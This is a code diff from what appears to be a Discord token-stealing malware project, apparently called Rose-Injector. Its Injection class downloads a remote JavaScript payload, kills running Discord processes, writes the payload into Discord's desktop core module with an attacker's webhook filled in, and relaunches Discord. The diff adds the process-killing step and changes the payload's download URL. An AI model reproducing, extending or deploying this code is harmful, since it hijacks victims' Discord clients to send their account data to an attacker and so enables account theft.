@@ -885,8 +885,8 @@ def GatherZips(paths1, paths2, paths3):
     }
 
 
-class Injection():
-    def __init__(self, hook):
+class Injection:
+    def __init__(self, hook: str) -> None:
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
             self.appdata + '\\Discord',
@@ -894,7 +894,11 @@ class Injection():
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get("https://raw.githubusercontent.com/Gum-s/Rose-Injector/main/injection/injection.js").text
+        self.code = requests.get('https://github.com/DamagingRose/Rose-Injector/blob/main/injection/injection.js').text
+
+        for proc in psutil.process_iter():
+            if 'discord' in proc.name().lower():
+                proc.kill()
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
@@ -905,7 +909,7 @@ class Injection():
                     f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', hook))
                     self.start_discord(dir)
 
-    def get_core(self, dir: str):
+    def get_core(self, dir: str) -> tuple:
         for file in os.listdir(dir):
             if re.search(r'app-+?', file):
                 modules = dir + '\\' + file + '\\modules'
@@ -918,7 +922,7 @@ class Injection():
                             continue
                         return core, file
 
-    def start_discord(self, dir: str):
+    def start_discord(self, dir: str) -> None:
         update = dir + '\\Update.exe'
         executable = dir.split('\\')[-1] + '.exe'
 
@@ -929,12 +933,8 @@ class Injection():
                     for file in os.listdir(app):
                         if file == executable:
                             executable = app + '\\' + executable
-                            subprocess.call([update,
-                                             '--processStart',
-                                             executable],
-                                            shell=True,
-                                            stdout=subprocess.PIPE,
-                                            stderr=subprocess.PIPE)
+                            subprocess.call([update, '--processStart', executable],
+                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 def ZipTelegram(path, arg, procc):
